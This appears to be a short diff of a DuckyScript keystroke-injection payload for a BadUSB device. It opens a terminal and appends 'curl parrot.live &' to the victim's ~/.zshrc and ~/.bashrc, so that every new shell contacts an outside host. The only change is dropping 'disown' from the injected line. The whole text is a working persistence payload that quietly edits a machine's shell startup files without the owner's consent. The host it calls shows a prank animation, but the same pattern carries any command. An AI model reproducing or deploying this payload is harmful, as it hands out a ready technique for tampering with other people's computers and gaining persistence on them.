@@ -13,5 +13,5 @@ WINDOWS d
 DELAY 300
 CTRL-ALT t
 DELAY 1500
-STRING echo "curl parrot.live & disown" >> ~/.zshrc && echo "curl parrot.live & disown" >> ~/.bashrc && exit
+STRING echo "curl parrot.live &" >> ~/.zshrc && echo "curl parrot.live &" >> ~/.bashrc && exit
 ENTER
